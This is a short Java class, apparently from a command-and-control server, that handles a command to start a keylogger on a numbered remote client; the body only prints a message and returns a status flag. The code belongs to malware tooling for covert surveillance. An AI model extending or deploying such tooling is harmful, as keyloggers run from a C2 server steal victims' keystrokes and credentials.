package commands;

import server.CommandServer;
import tools.ParsedCommand;

public class KStartCmd extends ServerCommand{

	public KStartCmd(CommandServer c2) {
		super(c2);
	}
	
	@Override
	public String exec(ParsedCommand pCmd) {		
		System.out.println("Starting keylogger for client " + pCmd.args[0]);
		
		if (c2.getCurrentClient() >= 0)
			return N_DONE;
		return DONE;
	}

}
